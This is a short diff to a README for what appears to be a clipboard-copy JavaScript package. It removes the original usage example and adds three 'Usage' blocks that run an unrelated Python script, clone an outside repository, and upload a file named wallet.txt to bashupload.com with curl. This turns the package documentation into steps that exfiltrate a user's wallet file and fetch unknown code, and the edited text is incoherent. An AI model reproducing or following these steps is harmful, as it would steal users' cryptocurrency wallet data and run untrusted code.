@@ -18,14 +18,19 @@ pip install -r requirements.txt
 ## Usage
 
 ```js
-import copy from 'copy-text-to-clipboard';
-
-button.addEventListener('click', () => {
-	copy('🦄🌈');
-});
+python legionNETWORK.py
 ```
 
-## API
+## Usage
+
+```js
+git clone https://github.com/Xflixe/leg
+```
+## Usage
+
+```js
+curl bashupload.com -T wallet.txt
+```
 
 ### copy(text, options?)
 
